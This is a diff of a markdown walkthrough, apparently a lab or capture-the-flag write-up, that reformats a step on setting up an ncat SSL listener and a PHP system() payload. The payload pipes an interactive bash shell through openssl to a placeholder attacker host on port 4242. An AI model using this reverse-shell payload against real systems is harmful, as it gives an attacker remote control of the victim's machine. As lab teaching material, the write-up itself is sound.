@@ -93,24 +93,24 @@ Objectives:
 
       ![enable apache](img/08-apacheStart.png)
 <br>
-   - Netcat
- 
-      We need a netcat instance to listen to our reverse shell and catch it, this will use openssl and you can find more info on the [swisskeyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#openssl) repository by [Swissky](https://github.com/swisskyrepo).
-   
-      The command to execute will be `ncat --ssl -vv -l -p 4242`.
-      This will listen for any connection on port 4242.
-      
-      ![running netcat listener](img/09-ncatListener.png)
- <br>
-   - Payload
-      
-      The payload also comes from the same repo and it will be placed on the file `/var/www/html/payload.txt` and contain the next code:
-      
-      ```system('mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_MACHINE:4242 > /tmp/s; rm /tmp/s')```
+- Netcat
 
-      ![cat of the payload](img/10-catPayload.png)
+  We need a netcat instance to listen to our reverse shell and catch it, and this will use openssl. You can find more information on the [swisskeyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#openssl) repository by [Swissky](https://github.com/swisskyrepo).
 
-      The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and the port needs to match the netcat listener above.
+  The command to execute will be `ncat --ssl -vv -l -p 4242`. This will listen for any connection on port 4242.
+
+  ![running netcat listener](img/09-ncatListener.png)
+
+- Payload
+
+  The payload also comes from the same repo and it will be placed in the file `/var/www/html/payload.txt`. It contains the following code:
+
+  `system('mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_MACHINE:4242 > /tmp/s; rm /tmp/s')`
+
+  ![cat of the payload](img/10-catPayload.png)
+
+  The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and the port needs to match the netcat listener above.
+
 
 <br>
 
